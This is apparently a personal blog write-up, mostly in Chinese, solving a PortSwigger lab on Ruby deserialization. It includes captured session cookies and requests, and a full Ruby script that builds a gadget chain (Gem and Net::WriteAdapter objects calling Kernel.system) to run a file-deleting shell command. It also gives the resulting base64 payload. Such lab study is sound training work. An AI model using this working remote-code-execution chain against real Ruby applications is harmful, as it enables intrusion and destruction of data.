---
layout: post
title: "Exploiting Ruby deserialization using a documented gadget chain"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---






# Exploiting Ruby deserialization using a documented gadget chain


教學:
http://m.bubuko.com/infodetail-3734787.html

Ruby2.X 远程代码执行漏洞分析之反序列化gadget链
https://www.anquanke.com/post/id/163962


```

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

#### Hint

Try searching for "ruby [deserialization](https://portswigger.net/web-security/deserialization) gadget chain" online.



本實驗使用基於序列化的會話機制和 Ruby on Rails 框架。 有記錄的漏洞利用可以通過該框架中的小工具鏈實現遠程代碼執行。

要解決實驗室問題，請找到一個記錄在案的漏洞利用並對其進行調整，以創建一個包含遠程代碼執行負載的惡意序列化對象。 然後，將此對像傳遞到網站以從 Carlos 的主目錄中刪除morale.txt 文件。
暗示

嘗試在線搜索“ruby 反序列化小工具鏈”。




```

wiener:peter


login -> update emial -> 抓包
```http

POST /my-account/change-email HTTP/1.1
Host: 0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net
Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVlM2dlZTVtM3V2YW1qa3k5dWp0bnhnNjZ4MjhtN3Q5eQY7B0YK
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net
Referer: https://0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```

不知道是啥語言的序列化
```

o:	User:@usernameI"wiener:EF:@access_tokenI"%e3gee5m3uvamjky9ujtnxg66x28m7t9y;F


```


cookie亂改123:
```http

POST /my-account/change-email HTTP/1.1
Host: 0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net
Cookie: session=123
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net
Referer: https://0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```


報錯ruby語言
```
index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t be read) (TypeError)
	format version 4.8 required; 63.109 given
	from -e:13:in `&lt;main&gt;&apos;
```

拿去google查到2.x版本的報錯
https://github.com/rubygems/rubygems/issues/1589







## RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN

A universal gadget chain to achieve arbitrary code execution in Ruby 2.x
https://www.elttam.com/blog/ruby-deserialization/

這邊我踩了一個坑，原因未知，有些教學的方法，我拿到的payload 跟它一樣，但我pass不了。

我是看了這影片才成功的。
https://www.youtube.com/watch?v=phGuYUM7BMw
payload 跟其它教學的不一樣。

改一下命令:
rm /home/carlos/morale.txt

```ruby
#! /usr/bin/ruby

require 'base64'


Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
#puts payload.inspect
#puts Marshal.load(payload)

puts Base64.encode64(payload)

```


這裡有換行字元所以要幫它瘦身。
```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

```

可以用老方法，但最快的方法就是直接拿去google 上面，然後它會trim 掉空格在複製
firefox 不行

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

```

關於要不要url encode 其實不用，因為url 是沒有換行的 所以它也是encode 把換行拿掉。


你直接提交這個就可以成功了。


